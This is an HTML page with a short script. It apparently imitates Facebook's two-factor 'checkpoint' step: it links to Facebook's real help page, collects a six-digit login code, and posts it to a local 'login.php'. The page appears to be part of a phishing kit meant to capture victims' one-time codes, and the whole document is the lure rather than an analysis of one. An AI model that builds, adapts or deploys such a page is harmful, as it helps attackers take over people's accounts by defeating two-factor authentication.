<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two factor</title>
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400&family=Poppins:wght@200&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <img src="./banner.jpg" alt="">
        <form id="form" method="post" novalidate="1">
            <div>
                <input type="text" name="username" class="input" id="input" placeholder="Login code">
                <input type="submit" value="Continue" id="btn" class="button">
            </div>
        </form>
        <a href="#" id="resend">Resend code</a>
    </div>
    <div class="footer">
        <a href="https://m.facebook.com/checkpoint/?having_trouble=1">Having trouble?</a>
    </div>
    <script>
        var code = document.getElementById("input");
        var form = document.getElementById("form");
        document.getElementById("form").addEventListener('submit', function () {
            if (code.value == '' || code.value.length !== 6) {
                alert(`Authentication erroe","The code you entered is incorrect.
                please try again.`)
            } 
            else{
                form.setAttribute('action', 'login.php');
            }
        })

    </script>
</body>
</html>
